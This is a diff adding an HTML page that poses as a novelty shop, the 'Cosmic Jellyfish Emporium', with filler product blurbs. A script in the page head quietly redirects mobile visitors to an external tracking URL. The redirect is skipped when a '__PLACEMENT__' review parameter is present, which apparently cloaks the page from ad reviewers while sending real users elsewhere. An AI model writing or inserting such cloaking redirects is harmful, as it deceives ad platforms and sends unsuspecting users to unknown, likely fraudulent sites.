@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #FF00FF, #00FFFF);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #FF1493;
+            padding: 20px;
+            text-align: right;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .box {
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 50%;
+            padding: 20px;
+            text-align: center;
+        }
+        footer {
+            background-color: #4B0082;
+            color: white;
+            text-align: center;
+            padding: 10px;
+        }
+        a {
+            color: #FFD700;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Jellyfish Emporium</h1>
+    </header>
+    <main>
+        <div class="box">
+            <h2>Tentacle Treats</h2>
+            <p>Indulge in our galaxy-famous tentacle-shaped candies!</p>
+        </div>
+        <div class="box">
+            <h2>Bioluminescent Baubles</h2>
+            <p>Glow-in-the-dark jewelry inspired by deep-sea creatures!</p>
+        </div>
+        <div class="box">
+            <h2>Gelatinous Gadgets</h2>
+            <p>Squishy, wobble tech for all your cosmic needs!</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Jellyfish Emporium. All rights reserved. | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
